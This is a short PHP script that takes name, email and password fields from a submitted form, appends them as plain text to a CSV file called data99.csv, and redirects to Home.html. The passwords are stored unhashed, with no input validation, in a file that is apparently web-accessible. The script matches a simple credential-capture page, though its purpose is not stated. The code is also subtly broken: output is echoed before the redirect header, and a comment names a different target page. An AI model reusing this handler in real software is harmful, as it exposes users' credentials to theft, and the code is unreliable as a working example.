<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $name = $_POST["name"] ?? "";
    $email = $_POST["email"] ?? "";
    $password = $_POST["password"] ?? "";

    // Check if the CSV file exists
    $fileExists = file_exists("data99.csv");

    // Open the CSV file in append mode
    $file = fopen("data99.csv", "a");

    // If file doesn't exist, add header
    if (!$fileExists) {
        fputcsv($file, array("Name", "Email", "Password"));
    }

    // Check if file opened successfully
    if ($file) {
        // Write form data as CSV
        fputcsv($file, array($name, $email, $password));
        fclose($file); // Close the file
        echo "Data saved successfully!";

        // Redirect to bot.html
        header("Location: Home.html");
        exit(); // Ensure script execution stops after redirection
    } else {
        echo "Error: Unable to open file for writing.";
    }
}
?>